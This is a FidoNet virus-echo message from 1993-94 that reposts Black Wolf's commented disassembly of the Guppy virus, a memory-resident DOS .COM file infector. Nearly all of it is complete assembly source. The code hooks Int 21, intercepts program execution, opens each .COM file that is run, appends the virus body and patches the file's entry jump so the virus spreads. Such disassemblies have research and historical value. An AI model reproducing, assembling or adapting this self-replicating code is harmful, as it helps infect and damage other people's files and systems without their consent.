;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 20 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : GUPPY.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Mikko Hypponen, 2:283/718 (06 Nov 94 16:39)
;* To   : Brad Frazee
;* Subj : GUPPY.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Mikko.Hypponen@f718.n283.z2.fidonet.org
;***************************************************************************
;*                          The Guppy Virus                                *
;*                      Disassembly by Black Wolf                          *
;***************************************************************************
;*      The Guppy virus is a relatively simple, very small, resident .COM  *
;*infector.  It uses the standard way for a regular program to go resident *
;*(i.e. Int 27) which makes the infected program terminate the first time  *
;*run.  After that, however, infected files will run perfectly.  This virus*
;*uses interesting methods to restore the storage bytes, as well as a      *
;*strange technique to restore control to an infected file after it has    *
;*already gone memory resident.                                            *
;*                                                                         *
;*Note: The Guppy virus was originally assembled with an assembler other   *
;*      than Tasm, so to keep it exactly the same some commands must be    *
;*      entered directly as individual bytes.  In these cases, the command *
;*      is commented out and the bytes are found below it.                 *
;*                                                                         *
;***************************************************************************

.model tiny
.radix 16
.code

        org     100h
start:
        call    Get_Offset

Get_Offset:
        pop     si                 ;SI = offset of vir +
                       ;(Get_Offset-Start)
        mov     ax,3521h
        mov     bx,ax
        int     21h                ;Get Int 21 Address

        mov     ds:[si+Int_21_Offset-103],bx      ;Save old Int 21
        mov     ds:[si+Int_21_Segment-103],es

        ;mov     dx,si             ;Bytes vary between assemblers
        db      89,0f2

        ;add     dx,offset Int_21_Handler-104
        db      83,0c2,1f

        mov     ah,25h
        int     21h                ;Set Int 21

        inc     dh                 ;Add 100h bytes to go resident
                       ;from handler
        push    cs
        pop     es
        int     27h                ;Terminate & stay resident


Int_21_Handler:
        cmp     ax,4B00h           ;Is call a Load & Execute?
        je      Infect             ;Yes? Jump Infect

        cmp     al,21h             ;Might it be a residency check?
        jne     Go_Int_21          ;No? Restore control to Int 21

        ;cmp     ax,bx             ;Are AX and BX the same?
        db      39,0d8

        jne     Go_Int_21          ;No, Restore control to Int 21

        push    word ptr [si+3dh]  ;3dh = offset of Storage_Bytes -
                       ;Get_Offset

                       ;This gets the first word of
                       ;storage bytes, which is then
                       ;popped to CS:100 to restore it.

        mov     bx,offset ds:[100] ;100 = Beginning of COM
        pop     word ptr [bx]

        mov     cl,[si+3Fh]        ;Restore third storage byte.
        mov     [bx+2],cl

Restore_Control:
        pop     cx
        push    bx
        iret                            ;Jump back to Host program.

Storage_Bytes         db      0, 0, 0

Infect:
        push    ax
        push    bx
        push    dx
        push    ds
        mov     ax,3D02h
        int     21h             ;Open File for Read/Write Access

        xchg    ax,bx
        call    Get_Offset_Two

Get_Offset_Two:
        pop     si
        push    cs
        pop     ds
        mov     ah,3F
        mov     cx,3
        sub     si,10           ;Set SI=Storage_Bytes

        ;mov     dx,si
        db      89,0f2

        int     21h             ;Read first 3 bytes of file

        cmp     byte ptr [si],0E9h      ;Is the first command a jump?
        jne     Close_File                   ;No? Jump to Close_File
        mov     ax,4202h
        xor     dx,dx
        xor     cx,cx
        int     21h                     ;Go to end of file

        xchg    ax,di
        mov     ah,40h
        mov     cl,98h                  ;Virus Size

        ;mov     dx,si
        db      89,0f2

        sub     dx,40h                  ;Beginning of virus
        int     21h                     ;Append virus to new host

        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        int     21h                     ;Go back to beginning of file

        mov     cl,3

        ;sub     di,cx
        db      29,0cf

        mov     [si+1],di
        mov     ah,40h

        ;mov     dx,si
        db      89,0f2

        int     21h                     ;Write 3 byte jump to file

Close_File:
        mov     ah,3Eh
        int     21h

        pop     ds
        pop     dx
        pop     bx
        pop     ax
Go_Int_21:
        db      0EAh                    ;Go On With Int 21
Int_21_Offset   dw      ?
Int_21_Segment  dw      ?

end     start

;-+-  UC2 Support France
; + Origin: NETTIS Public Acces Internet (603)432-2517 (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/d            Warn if duplicate symbols in libraries
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

